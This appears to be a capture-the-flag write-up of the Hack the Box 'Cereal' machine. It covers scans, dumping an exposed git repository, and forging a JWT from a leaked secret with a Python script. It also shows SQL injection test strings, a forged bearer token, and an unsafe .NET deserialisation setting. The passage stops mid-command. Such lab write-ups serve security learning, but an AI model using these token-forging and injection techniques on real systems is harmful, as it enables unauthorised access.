---
layout: post
layout: default
title: "Cereal"
description: "My writeup for the HacktheBox Cereal Machine (User only). A really difficult Web machine involving a chain of XSS and Deserialisation vulnerabilities in a .NET application."
category_string: "Hack the Box (HTB)"
custom_css: ['blogs']
---

# Hack the Box - Cereal (User Only)

Contents
- [Enumeration](#enumeration)
- [Website](#website)
- [source.cereal.htb](#sourcecerealhtb-1)
- [Source Code Analysis](#source-code)
  - [Git Dumper](#git-dumper)
  - [Analysing Controllers](#controllers--routes)
  - [Analysing Authentication](#authentication)
- [Forging Cereal Requests](#cereal-requests)
- [Initial Deserialisation](#deserialisation)
  - [Finding Custom Gadget](#custom-gadget-chain)
  - [Crafting a Payload](#crafting-a-payload)
- [Initial XSS](#xss-in-admin-panel)
  - [Finding Markdown XSS CVE](#fixing-the-xss)
- [Starting Exploit Chain](#exploit-chain)
  - [Creating Target Cereal](#creating-the-target-cereal)
  - [Creating XSS Cereal](#creating-the-xss-cereal)
    - [Testing Locally](#local-testing)
    - [Bypassing HTTPS Restriction](#https-restriction)
    - [Working XSS Payload](#submitting-our-test-payload)
  - [Attempting Full Chain](#trying-full-chain)
    - [Fiddling with Deserialisation Payload](#fiddling-with-deserialisation-payload)
    - [Fixing XSS Request Format](#fixing-xss-request-format)
    - [Tracking XSS Response](#tracking-xss-response)
  - [Automation](#automating-it)
    - [Debugging the Deserialisation](#debugging)
    - [Using Fetch to Debug](#using-fetch)
    - [Final Payload](#adjusting-the-filepath-final-payload)
- [Shell as Sonny](#shell-as-sonny)

# Overview

**Box Details**

|IP|User-Rated Difficulty|OS|Date Started|Date User Completed|
|---|---|---|---|---|
|10.10.10.217|7.4|Windows|2020-03-16|2020-04-18|

This was a very hard box based on a .NET web application; it required a lot of source code analysis and involved a chain of exploits to get a foothold on the box. After reversing the authentication system and forging a JWT token, you could figure out how to insert malicious data into the database to trigger a deserialisation vulnerability. However, the triggering HTTP request had an IP address limitation, meaning only the box itself could trigger it. This meant we needed an XSS or SSRF vulnerability to force a request, which came via a CVE in a markdown rendering library. After this, we could trigger our deserialisation payload and upload a shell to the box.

A bit of advanced warning - this writeup is *long*. I have tried to include regular 'checkpoints' to let you skip ahead to working payloads. But a big part of this box for me *was* the debugging. It was intense, and full of little hurdles in the formatting of payloads and subtleties of scripts. I think it's important to include this so you can see what I learned. But I understand it's not for everyone.

---

I loved this box. It was my first dive into some really complex Web Application Hacking. I'd been looking at Deserialisation with my hacking society, but hadn't touched it in .NET, and the XSS on this box was really interesting too. It was great to chain everything together and find all the little pieces.

What also surprised me about this box was the sheer number of little hitches along the way. Maybe this was due to the way I approached it with having fairly little experience, but actually trying to debug things like only being able to communicate over HTTPS and sending data back to my box via `<img>` tags meant I learnt an awful lot while doing this. It was well worth the time investment, and truly was a lesson in persistence.

I only managed to finish the user stage of this box (although that was no small task). I had a look at the root path at the time, but due to my little Windows priv esc experience I decided to go back and focus on some retired boxes to try and learn a little more. I also had a CTF to run and an AWS exam, and by the time they were finished and I could come back to the box again it was about to retire. I might come back to the root stage at some point, but for now I'm uploading what I've got.

---

I used my new <a href="http://www.github.com/Twigonometry/writeup-converter">writeup converter tool</a> to port this over to my site - give it a try!

You can also view this writeup in my [Cybersecurity Notes repository](https://github.com/Twigonometry/Cybersecurity-Notes).

## Scripts

All the scripts I used on this box are available on my github, at https://github.com/Twigonometry/CTF-Tools/tree/master/hack_the_box/cereal

## Ratings

I rated the user flag a 7/10 for difficulty. It was pretty complex, and involved chaining several exploits together, each with little restrictions baked in just to screw you over.

# Tags

#writeup #web #xss #markdown #deserialisation #dotnet #windows

# Loot

Secret Key:

```
secretlhfIH&FY\*#oysuflkhskjfhefesf
```

# Enumeration

## Autorecon

```bash
$ autorecon 10.10.10.217
[*] Scanning target 10.10.10.217
[*] Running service detection nmap-full-tcp on 10.10.10.217
[*] Running service detection nmap-quick on 10.10.10.217
[*] Running service detection nmap-top-20-udp on 10.10.10.217
[*] Service detection nmap-quick on 10.10.10.217 finished successfully in 24 seconds
[*] Found ssh on tcp/22 on target 10.10.10.217
[*] Found http on tcp/80 on target 10.10.10.217
[*] Found ssl/http on tcp/443 on target 10.10.10.217
[*] Running task tcp/22/sslscan on 10.10.10.217
[*] Running task tcp/22/nmap-ssh on 10.10.10.217
[*] Running task tcp/80/sslscan on 10.10.10.217
[*] Running task tcp/80/nmap-http on 10.10.10.217
[*] Running task tcp/80/curl-index on 10.10.10.217
[*] Running task tcp/80/curl-robots on 10.10.10.217
[*] Running task tcp/80/wkhtmltoimage on 10.10.10.217
[*] Running task tcp/80/whatweb on 10.10.10.217
[*] Task tcp/22/sslscan on 10.10.10.217 finished successfully in less than a second
[*] Task tcp/80/sslscan on 10.10.10.217 finished successfully in less than a second
[*] Running task tcp/80/nikto on 10.10.10.217
[*] Running task tcp/80/gobuster on 10.10.10.217
[*] Task tcp/80/curl-robots on 10.10.10.217 finished successfully in 1 second
[*] Task tcp/80/curl-index on 10.10.10.217 finished successfully in 1 second
[*] Running task tcp/443/sslscan on 10.10.10.217
[*] Running task tcp/443/nmap-http on 10.10.10.217
[!] Task tcp/80/gobuster on 10.10.10.217 returned non-zero exit code: 1
[*] Running task tcp/443/curl-index on 10.10.10.217
[*] Task tcp/443/curl-index on 10.10.10.217 finished successfully in 1 second
[*] Running task tcp/443/curl-robots on 10.10.10.217
[*] Task tcp/443/curl-robots on 10.10.10.217 finished successfully in less than a second
[*] Running task tcp/443/wkhtmltoimage on 10.10.10.217
[*] Task tcp/22/nmap-ssh on 10.10.10.217 finished successfully in 7 seconds
[*] Running task tcp/443/whatweb on 10.10.10.217
[*] Task tcp/80/wkhtmltoimage on 10.10.10.217 finished successfully in 16 seconds
[*] Running task tcp/443/nikto on 10.10.10.217
[*] Task tcp/443/wkhtmltoimage on 10.10.10.217 finished successfully in 13 seconds
[*] Running task tcp/443/gobuster on 10.10.10.217
[!] Task tcp/443/gobuster on 10.10.10.217 returned non-zero exit code: 1
[*] Task tcp/443/whatweb on 10.10.10.217 finished successfully in 22 seconds
[*] Task tcp/80/whatweb on 10.10.10.217 finished successfully in 30 seconds
[*] [15:42:32] - There are 7 tasks still running on 10.10.10.217
[*] Task tcp/443/nmap-http on 10.10.10.217 finished successfully in 45 seconds
[*] Task tcp/80/nmap-http on 10.10.10.217 finished successfully in 1 minute, 22 seconds
[*] [15:43:32] - There are 5 tasks still running on 10.10.10.217
[*] Service detection nmap-full-tcp on 10.10.10.217 finished successfully in 2 minutes, 14 seconds
[*] Task tcp/443/sslscan on 10.10.10.217 finished successfully in 1 minute, 54 seconds
[*] [15:44:32] - There are 3 tasks still running on 10.10.10.217
[*] [15:45:32] - There are 3 tasks still running on 10.10.10.217
[*] Task tcp/80/nikto on 10.10.10.217 finished successfully in 3 minutes, 40 seconds
[*] [15:46:32] - There are 2 tasks still running on 10.10.10.217
[*] [15:47:32] - There are 2 tasks still running on 10.10.10.217
[*] [15:48:32] - There are 2 tasks still running on 10.10.10.217
[*] [15:49:32] - There are 2 tasks still running on 10.10.10.217
[*] Service detection nmap-top-20-udp on 10.10.10.217 finished successfully in 8 minutes, 58 seconds
[*] [15:50:32] - There is 1 task still running on 10.10.10.217
[*] [15:51:32] - There is 1 task still running on 10.10.10.217
[*] [15:52:32] - There is 1 task still running on 10.10.10.217
[*] [15:53:32] - There is 1 task still running on 10.10.10.217
[*] [15:54:32] - There is 1 task still running on 10.10.10.217
[*] Task tcp/443/nikto on 10.10.10.217 finished successfully in 13 minutes, 8 seconds
[*] Finished scanning target 10.10.10.217 in 13 minutes, 48 seconds
[*] Finished scanning all targets in 13 minutes, 48 seconds!
```

## Nmap

Here is the output of Autorecon's full TCP Nmap scan:

```bash
# Nmap 7.91 scan initiated Tue Mar 16 15:41:35 2021 as: nmap -vv --reason -Pn -A --osscan-guess --version-all -p- -oN /root/Documents/HTB/cereal/results/10.10.10.217/scans/_full_tcp_nmap.txt -oX /root/Documents/HTB/cereal/results/10.10.10.217/scans/xml/_full_tcp_nmap.xml 10.10.10.217
Nmap scan report for 10.10.10.217
Host is up, received user-set (0.022s latency).
Scanned at 2021-03-16 15:41:37 GMT for 128s
Not shown: 65532 filtered ports
Reason: 65532 no-responses
PORT    STATE SERVICE  REASON          VERSION
22/tcp  open  ssh      syn-ack ttl 127 OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 08:8e:fe:04:8c:ad:6f:df:88:c7:f3:9a:c5:da:6d:ac (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDJ8WunqAHy9aWMuwZtw8rYXPpcWFOamTOdxvUDuFEzyvemSH8H8aPN3xVb8qhv6ZvSLW7gEDyNcu/+vPKo+G+Vy9sKyaFFdk7FiDgCIqnx5UyxPjZxBu6QxES8FndXmHoS3vifHcxBS3Y/e1Bx0MTLVfhWmBx7lJRpR4R7WHDgJ19yBsnB5921vNpVpSTzPV8eQI2lukoY/UMeatTLsB4SHqEljrUp3phY8YY6MHAWyVE0Ofp2xCiKhFwzfcl/kMEPSplrerse9MFCfpmD571vvzXiC9TKPajPdceVxKXJiBq6YjFE9gnBdmiiBVnGNZ735wiQe13GGvmEk9tuPAat
|   256 fb:f5:7b:a1:68:07:c0:7b:73:d2:ad:33:df:0a:fc:ac (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOv2yzt3CGzoXPn56DcYScZq9TapkXkNCTez76ygDDwAKBREa325DDx6ZDd99qtntl28Gzi1mZAfntdNulXmxqI=
|   256 cc:0e:70:ec:33:42:59:78:31:c0:4e:c2:a5:c9:0e:1e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINFh4uMa9OjCINZ7M6/DSRhceOcHRP+n6o+py/ERV5fm
80/tcp  open  http     syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/plain).
443/tcp open  ssl/http syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-favicon: Unknown favicon MD5: 1A506D92387A36A4A778DF0D60892843
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/plain).
| ssl-cert: Subject: commonName=cereal.htb
| Subject Alternative Name: DNS:cereal.htb, DNS:source.cereal.htb
| Issuer: commonName=cereal.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-11-11T19:57:18
| Not valid after:  2040-11-11T20:07:19
| MD5:   8785 41e5 4962 7041 af57 94e3 4564 090d
| SHA-1: 5841 b3f2 29f0 2ada 2c62 e1da 969d b966 57ad 5367
| -----BEGIN CERTIFICATE-----
| MIIDLjCCAhagAwIBAgIQYSvrrxz65LZHzBcVnRDa5TANBgkqhkiG9w0BAQsFADAV
| MRMwEQYDVQQDDApjZXJlYWwuaHRiMB4XDTIwMTExMTE5NTcxOFoXDTQwMTExMTIw
| MDcxOVowFTETMBEGA1UEAwwKY2VyZWFsLmh0YjCCASIwDQYJKoZIhvcNAQEBBQAD
| ggEPADCCAQoCggEBAMoaGpaAR2ALY//K4WkfjOPTXqfzIPio6lQpS2NOG9yMlDVT
| dYeFRwRyAxqgkGfNVchuKjnyc9BeJqILLyYDn5aK7/pIKc7bAPTs7B2YQpQXUTmH
| nVuP0JHMhflzDCMigr5XuZ7/xXh2fZbSantK/1PqeilClmjunoNBTsFHhNrb7XfK
| 2fwQDB0QS8TvLmcVKwx+qGt8Mtod165LUe6LPc1dK8tO5AxVGFoqE9w7jDa+QwK8
| eCazu5S7AV9TvInJrniz58fZ8zbJB4c2CQOB6BtFF9f3tft4pjAlToDifVZ0BMEl
| uTwpZFc8YxXNb0taTWSBTIpowL3RhZ3zmlmsebkCAwEAAaN6MHgwDgYDVR0PAQH/
| BAQDAgWgMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAoBgNVHREEITAf
| ggpjZXJlYWwuaHRighFzb3VyY2UuY2VyZWFsLmh0YjAdBgNVHQ4EFgQU6pyk6xnL
| i8gMA3lTOcCaV3zlFP8wDQYJKoZIhvcNAQELBQADggEBAAUQw2xrtdJavFiYgfl8
| NN6fA0jlyqrln715AOipqPcN6gntAynC378nP42nr02cQCoBvXK6vhmZKeVpviDv
| pO9udH/JB0sKmCFJC5lQ3sHnxSUExBk+e3tUpiGGgKoQnCFRRBEkOTE3bI0Moam9
| Hd1OD32cp6uEmY7Nzhb6hYkR3S/MeYH78PvFZ430gLCFohc7aqimngSohAz8f+xc
| rS352J9a3+0TemS1KduwC/KFFG0o3ItDJSj4ypq9B6x2HGstfzmKzGqIu74Z5tXu
| guCIa2Jau8OdQ7K6aiPn39W+EnFLUQAMHqq7TZpxTb1SkV3hoVNvh63nxC1wyDrL
| iy0=
|_-----END CERTIFICATE-----
|_ssl-date: 2021-03-16T14:54:00+00:00; -49m45s from scanner time.
| tls-alpn: 
|_  http/1.1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=3/16%OT=22%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=6050D231%P=x86_64-pc-linux-gnu)
SEQ(SP=102%GCD=1%ISR=108%II=I%TS=U)
OPS(O1=M54DNW8NNS%O2=M54DNW8NNS%O3=M54DNW8%O4=M54DNW8NNS%O5=M54DNW8NNS%O6=M54DNNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M54DNW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: Busy server or unknown class
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -49m45s

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   22.91 ms 10.10.14.1
2   22.74 ms 10.10.10.217

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Mar 16 15:43:45 2021 -- 1 IP address (1 host up) scanned in 133.41 seconds
```

Key findings:
- there are just a few ports open:
	- 22 for SSH
	- 80 for HTTP - Running a Microsoft IIS Server
	- 443 for HTTPS
- OpenSSH shows this is a Windows 7.7 box
- The SSL certificate exposes two domains, `cereal.htb` and `source.cereal.htb`

## Gobuster

An initial scan of the `cereal.htb` domain reveals there is some sort of generic response code for non-existent pages, meaning Gobuster gets several false positives:

```bash
gobuster dir -u http://cereal.htb -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://cereal.htb
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/03/16 16:05:18 Starting gobuster
===============================================================
Error: the server returns a status code that matches the provided options for non existing urls. http://cereal.htb/de74da20-2e95-4ad1-bcf1-6d35cd02ad52 => 307. To force processing of Wildcard responses, specify the '--wildcard' switch
root@kali:~/Documents/HTB/cereal/results/10.10.10.217# gobuster dir -u http://cereal.htb -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt --wildcard
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://cereal.htb
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/03/16 16:05:55 Starting gobuster
===============================================================
/modules (Status: 307)
/.php (Status: 307)
/cgi-bin (Status: 307)
/images (Status: 307)
/admin (Status: 307)
/search (Status: 307)
/cache (Status: 307)
/.html (Status: 307)
/includes (Status: 307)
/templates (Status: 307)

....[continues until stopped]....
```

We can deal with this behaviour by setting the `307` response code as a blacklisted response. Doing so overwrites the usual behaviour, so we also have to blacklist `404`:

```bash
┌──(mac㉿kali)-[~]
└─$ gobuster dir -u http://cereal.htb -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -b 307,404
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cereal.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   307,404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/06/05 18:35:39 Starting gobuster in directory enumeration mode
===============================================================
                                
===============================================================
2021/06/05 18:37:23 Finished
===============================================================
```

However, nothing was found.

### source.cereal.htb

```bash
┌──(mac㉿kali)-[~/Documents/HTB/cereal]
└─$ gobuster dir -u http://source.cereal.htb -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt --wildcard -s 200,301,302
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://source.cereal.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/06/05 18:39:38 Starting gobuster in directory enumeration mode
===============================================================
/aspnet_client        (Status: 301) [Size: 162] [--> http://source.cereal.htb/aspnet_client/]
/uploads              (Status: 301) [Size: 156] [--> http://source.cereal.htb/uploads/]      
/.                    (Status: 500) [Size: 10090]                                            
/.git                 (Status: 301) [Size: 153] [--> http://source.cereal.htb/.git/]         
                                                                                             
===============================================================
2021/06/05 18:41:22 Finished
===============================================================
```

Crucially, this finds a `/.git` directory and a `/uploads` directory.

# Website

## Basic Enum

We can see what powers the site by looking at its headers:

```bash
$ curl -v http://cereal.htb
*   Trying 10.10.10.217:80...
* Connected to cereal.htb (10.10.10.217) port 80 (#0)
> GET / HTTP/1.1
> Host: cereal.htb
> User-Agent: curl/7.74.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 307 Temporary Redirect
< Transfer-Encoding: chunked
< Location: https://cereal.htb/
< Server: Microsoft-IIS/10.0
< X-Rate-Limit-Limit: 5m
< X-Rate-Limit-Remaining: 149
< X-Rate-Limit-Reset: 2021-06-05T18:26:04.5220616Z
< X-Powered-By: Sugar
< Date: Sat, 05 Jun 2021 18:21:04 GMT
< 
* Connection #0 to host cereal.htb left intact
```

`Sugar` is an interesting addition in the `X-Powered-By` header that I've never seen before. There also appears to be a rate limit in place, which is something to bear in mind.

## Certificate

Immediately upon visiting the site, Firefox displays a warning about a self-signed certificate

![](/assets/images/blogs/Pasted image 20210406083553.png)

Clicking 'View Certificate' reveals a subdomain, `source.cereal.htb`

![](/assets/images/blogs/Pasted image 20210406083753.png)

(this was also present in the Nmap scan)

If we want to view the certificate again after accepting it, just click the padlock in the browser and the `>`, then `More Information`. This allows viewing the certificate:

![](/assets/images/blogs/Pasted image 20210605185025.png)

## Login Form

Visiting the main site, we are just presented with a login form:

![](/assets/images/blogs/Pasted image 20210605184135.png)

We can do some basic fuzzing of the form:
- try `admin:admin`
- try a simple SQL Injection with the username/password `' OR 1=1;--`
- try an SQLi polyglot to see if the for might be vulnerable: `SLEEP(1) /*’ or SLEEP(1) or’” or SLEEP(1) or “*/","password":"SLEEP(1) /*’ or SLEEP(1) or’” or SLEEP(1) or “*/"`

None of this gave any results. There is also seemingly no way to register - visiting `/register` gives us a blank page:

![](/assets/images/blogs/Pasted image 20210605184317.png)

Let's take a look at the `source.cereal.htb` domain and see if there's anything else useful.

# source.cereal.htb

Visiting `source.cereal.htb` in the browser gives us this page:

![](/assets/images/blogs/Pasted image 20210605184402.png)

This is interesting - it gives us some potentially useful information:
- The version string: `Version Information: Microsoft .NET Framework Version:4.0.30319; ASP.NET Version:4.7.3690.0 `
- And a potential full path disclosure for the application: `c:\inetpub\source\default.aspx`

The page doesn't seem to have any interactivity beyond this.

# Source Code

## Git Dumper

We know from our [gobuster scan](#source-cereal-htb) that there is a `.git` folder on the `source.cereal.htb` domain. So we can try and download the source code for the site using the tool `gitdumper`:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/cereal]
└─$ /opt/git-dumper/git-dumper.py http://source.cereal.htb/.git site/
```

This downloads all the code, and we can open it in VSCode.

Running `git log` shows us an interesting commit:

![](/assets/images/blogs/Pasted image 20210605185207.png)

We can view the details with `git show`:

![](/assets/images/blogs/Pasted image 20210605185310.png)

There are also some interesting files in the `.gitignore` - namely, `cereal.db`, which is likely the name of the database file being used. It's not in the downloaded repository.

## Controllers + Routes

I was unfamiliar with .NET going into this, but I'd done a little C# and a lot of Laravel - the first thing I went looking for to try and understand the application was Controllers & Routes.

`site/Controllers/RequestsController.cs` has what looks like controller methods - 

![](/assets/images/blogs/Pasted image 20210605191522.png)

I couldn't find a corresponding 'route' pointing to these methods, like in Laravel, so I assumed this is the entire route definition. However, I did find the `site/ClientApp/src/_components/PrivateRoute.jsx` component, which seems to check for authentication:

![](/assets/images/blogs/Pasted image 20210605191834.png)

I looked for instances of the private route component, and found a few more routes in the `site/ClientApp/src/App/App.jsx` file:

![](/assets/images/blogs/Pasted image 20210605191917.png)

This shows us there is an authenticated `/admin` page. It is defined by `site/ClientApp/src/AdminPage/AdminPage.jsx` and seems to render Cereal Requests from the database:

![](/assets/images/blogs/Pasted image 20210605192048.png)

`site/ClientApp/src/HomePage/HomePage.jsx` seems to be a submission form, and tells us which fields we need to submit a cereal:

![](/assets/images/blogs/Pasted image 20210605212024.png)

The `site/ClientApp/src/_services/request.service.js` file tells us a bit about request methods, also:

![](/assets/images/blogs/Pasted image 20210605212547.png)

## Authentication

Auth seems to be handled mostly by the `site/Services/UserService.cs` file, which generates JWT tokens:

![](/assets/images/blogs/Pasted image 20210605192151.png)

Users seem to be saved locally using Javascript, as shown in the `site/ClientApp/src/_services/authentication.service.js` file:

![](/assets/images/blogs/Pasted image 20210605212657.png)

We can use the token in the repository's old commits to craft a JWT token.

### Using .NET

I made an attempt to generate a JWT with C# code, looking at these links for reference:
- https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/main-and-command-args/
- https://stackoverflow.com/questions/20392243/run-c-sharp-code-on-linux-terminal
- https://stackoverflow.com/questions/18677837/decoding-and-verifying-jwt-token-using-system-identitymodel-tokens-jwt

This was the code I used, lifted from the main project and deleting the references to other unnecessary libraries:

```csharp
using System;
using System.Collections.Generic;
using System.IdentityModel.Tokens.Jwt;
using System.Security.Claims;

namespace TokenGeneration {
    class GenerateToken {
        static void Main(string[] args)
        {
            var tokenHandler = new JwtSecurityTokenHandler();
            var key = Encoding.ASCII.GetBytes("secretlhfIH&FY*#oysuflkhskjfhefesf");

            //create token descriptor for user id 1
            var tokenDescriptor = new SecurityTokenDescriptor
            {
                Subject = new ClaimsIdentity(new Claim[]
                {
                    new Claim(ClaimTypes.Name, "1")
                }),
                Expires = DateTime.UtcNow.AddDays(7),
                SigningCredentials = new SigningCredentials(new SymmetricSecurityKey(key), SecurityAlgorithms.HmacSha256Signature)
            };

            var token = tokenHandler.CreateToken(tokenDescriptor);
            Console.WriteLine(tokenHandler.WriteToken(token));
        }
    }
}
```

I tried `mcs` to compile it, but it was missing a dependency:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/cereal]
└─$ mcs -out:gentoken.exe gentoken.cs 
gentoken.cs(3,14): error CS0234: The type or namespace name `IdentityModel' does not exist in the namespace `System'. Are you missing an assembly reference?
Compilation failed: 1 error(s), 0 warnings
```

I knew I could resolve this on Windows pretty easily with Visual Studio, but didn't have it setup on Linux. I considered [installing .NET](https://docs.microsoft.com/en-us/dotnet/core/install/linux-ubuntu) but didn't think it was worth fiddling with if there was an easier way. I also didn't want to set up a Windows VM, so looked to see if I could use Python instead.

### Using Python

I used the `jwt` library for this: [https://pyjwt.readthedocs.io/en/latest/](https://pyjwt.readthedocs.io/en/latest/)

After a bit of experimenting with JWT tokens I came to the following code to spit a valid one out:

```python
import jwt
from datetime import datetime, timedelta

#take key from old git code - commit ID 8f2a1a88f15b9109e1f63e4e4551727bfb38eee5
key = "secretlhfIH&FY*#oysuflkhskjfhefesf"

#encode with HMAC-SHA-256
encoded = jwt.encode({"exp": datetime.utcnow() + timedelta(days=7), "name": 1}, key, algorithm="HS256")

print(encoded)
```

This can now be used when making requests, for example to `/requests`. This is what I used to build up a valid one - one of the key things that caused issues was not giving the JWT an expiry, which I thought was interesting - `WWW-Authenticate: Bearer error="invalid_token", error_description="The token has no expiration"`

## IP Whitelist

Several functions have the decorator:

```csharp
[Authorize(Policy = "RestrictIP")]
```

This means those functions are only accessible by localhost, i.e. the box itself. We can see this if we request a cereal:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/cereal/test-www]
└─$ curl -i -s -k -X $'GET' \
    -H $'Host: 10.10.10.217' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2MTgzMDA5ODMsIm5hbWUiOjF9.VgWvwKp0RMrr4NLnJxnIWoUJII3JQlUJecyFVpDlXvo' \
    $'https://10.10.10.217/requests?id=11'
HTTP/2 403 
server: Microsoft-IIS/10.0
strict-transport-security: max-age=2592000
x-rate-limit-limit: 5m
x-rate-limit-remaining: 148
x-rate-limit-reset: 2021-04-06T09:46:42.2058184Z
x-powered-by: Sugar
date: Tue, 06 Apr 2021 09:42:08 GMT
```

Even with a valid token, we receive a `403` status code.

This means that, to make requests to these controller methods, we must force the box to make a request on our behalf - this is known as a Server Side Request Forgery (SSRF).

There are several methods that we want to be able to access, such as viewing a cereal - reviewing the code in `Controllers/RequestsController.cs`, the following function immediately stands out as being potentially dangerous:

```csharp
var cereal = JsonConvert.DeserializeObject(json, new JsonSerializerSettings
{
	TypeNameHandling = TypeNameHandling.Auto
});
```

But this is one of the routes subject to the IP restriction, so we'll need a way to bypass this.

# Cereal Requests

Now we've picked the code apart a little, we can try interacting with the site.

If we go to `/requests` in our browser and pass it to Burp, we can capture the request and then change the request method:

![](/assets/images/blogs/Pasted image 20210406085414.png)

We can press `Ctrl + R` to send to repeater, then right-click and select 'Change request method' to turn it into a POST request. We also need to set the `Content-Type` header to `application/json`, as the app expects JSON and otherwise responds with `415 Unsupported Media Type`.

![](/assets/images/blogs/Pasted image 20210406085814.png)

Let's add our token to the request. We add the following header: `Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2MTgzMDA5ODMsIm5hbWUiOjF9.VgWvwKp0RMrr4NLnJxnIWoUJII3JQlUJecyFVpDlXvo` and resubmit the request.

*Note:* This is just the token I used when doing this box - it will expire after seven days, so you will need to generate your own using `gentoken.py` if you are doing this box.

![](/assets/images/blogs/Pasted image 20210406090351.png)

We are no longer unauthorised :)

Now we need to craft a valid request. Experimenting with some JSON input gives us some clues about how to structure the request - namely, that the `"JSON"` field is required:

![](/assets/images/blogs/Pasted image 20210406090615.png)

Submitting some more JSON reveals more about how it should be structured:

![](/assets/images/blogs/Pasted image 20210406091211.png)

It seems to need `"` characters to be escaped - there were some clues about this in the source code, for example `var header = "{\\"typ\\":\\"JWT\\",\\"alg\\":\\"HS256\\"}";`, but just to be sure I formatted my payload by running it through the `JSON.stringify()` method used by the website.

I created the JS file `test-www/stringify.js`:

```javascript
console.log(JSON.stringify({ JSON: JSON.stringify({title:'t',flavor:'f',color:'#FFF',description:'d' }) }))
```

And ran it from a very simple HTML file:

```html
<html>
    <head>
        <script defer src="./stringify.js"></script>
    </head>
</html>
```

Then opened it in firefox:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/cereal/test-www]
└─$ firefox index.html
```

![](/assets/images/blogs/Pasted image 20210406092035.png)

Which gives us the correctly-formatted payload:

```
{"JSON":"{\"title\":\"t\",\"flavor\":\"f\",\"color\":\"#FFF\",\"description\":\"d\"}"}
```

![](/assets/images/blogs/Pasted image 20210406092416.png)

We have successfully created a cereal!

I tried to save the Burp request as a `curl` command, but it was quite temperamental. To replicate a request in `curl`, right click in repeater and press 'Copy as curl command'. I find it easier to do it in Burp Suite the first time, as it creates many of the headers for you, but for replicating it later `curl` is faster:

```bash
curl -i -s -k -X $'POST' \
